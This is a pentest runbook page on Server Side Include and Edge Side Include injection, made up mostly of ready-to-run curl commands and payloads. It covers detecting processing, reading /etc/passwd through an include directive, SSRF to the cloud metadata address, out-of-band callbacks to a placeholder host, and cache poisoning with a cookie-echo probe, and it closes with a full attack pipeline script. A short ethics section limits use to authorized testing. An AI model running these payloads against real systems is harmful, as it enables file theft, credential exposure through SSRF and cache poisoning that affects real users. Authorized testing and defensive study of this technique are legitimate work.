---
title: "Server Side Inclusion / Edge Side Inclusion Injection"
description: "Injecting SSI directives and ESI tags into cached or templated content to read files, reach internal hosts, or execute code."
phase: Web
order: 72
tags:
  - ssi
  - esi
  - injection
  - cache
tools:
  - curl
  - burp suite
updated: 2026-10-01
---

An SSI/ESI injection runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: get a directive into a template or cached fragment that is processed later, then prove file read, SSRF, or code execution in a controlled way.

## 1. Detect processing

```bash
for p in "/index.shtml" "/page.stm" "/frag.shtml"; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" "https://target.com$p"
done
curl -sI "https://target.com/" | grep -iE 'via|x-cache|surrogate|akamai|fastly|varnish'
```

SSI runs on the origin (Apache/nginx/IIS); ESI runs at the CDN/edge.

## 2. Find a reflection point

```bash
# Harmless echo probe
curl -s "https://target.com/page?name=%3C!--%23echo%20var=%22DATE_LOCAL%22%20--%3E"
```

If the response contains an expanded value rather than the raw text, injection works. Some apps only process on a second fetch or once the fragment is cached.

## 3. Prove SSI processing

```bash
# Inject echo, then re-fetch to trigger processing
curl -s "https://target.com/page" \
  --data-urlencode 'comment=<!--#echo var="HTTP_USER_AGENT" -->'
curl -s "https://target.com/page"      # second fetch
```

## 4. File read and SSRF

```bash
# Local file read
curl -s --data-urlencode 'name=<!--#include virtual="/etc/passwd" -->' \
  "https://target.com/page"
curl -s "https://target.com/page"

# ESI SSRF to cloud metadata
curl -s --data-urlencode 'name=<esi:include src="http://169.254.169.254/latest/meta-data/" />' \
  "https://target.com/page"
curl -s "https://target.com/page"
```

Prove SSRF with an OOB listener instead of dumping internal pages: `python3 -m http.server 8000` and point `src` at `http://YOUR_HOST:8000/ssi`.

## 5. Cache poisoning and escalation

```bash
curl -s "https://target.com/fragment?q=%3C!--%23echo%20var=%22HTTP_COOKIE%22%20--%3E" \
  -H "X-Cache-Key: test"
curl -s "https://target.com/fragment?q=normal"   # confirm from a second session
```

For `exec cmd`/RCE escalation, only proceed if explicitly authorized and use a canary command.

## Full pipeline

```bash
B="https://target.com"

# 1. Detect processing surfaces
for p in "/index.shtml" "/page.stm"; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" "$B$p"
done
curl -sI "$B/" | grep -iE 'via|x-cache|surrogate'

# 2. Harmless echo probe + refetch
curl -s "$B/page" --data-urlencode 'name=<!--#echo var="DATE_LOCAL" -->'
curl -s "$B/page"

# 3. File read (read-only)
curl -s "$B/page" --data-urlencode 'name=<!--#include virtual="/etc/passwd" -->'
curl -s "$B/page"

# 4. ESI SSRF via OOB listener
python3 -m http.server 8000 &
curl -s "$B/page" --data-urlencode 'name=<esi:include src="http://YOUR_HOST:8000/ssi" />'
curl -s "$B/page"
```

## Ethics & legality

- Only process directives on endpoints within the authorized scope.
- Prefer read-only includes and `echo`; never use `exec`/RCE unless explicitly authorized.
- Prove SSRF with an OOB callback, not by dumping internal content.
- Do not poison a shared cache in a way that affects real users; use a test key or staging host.
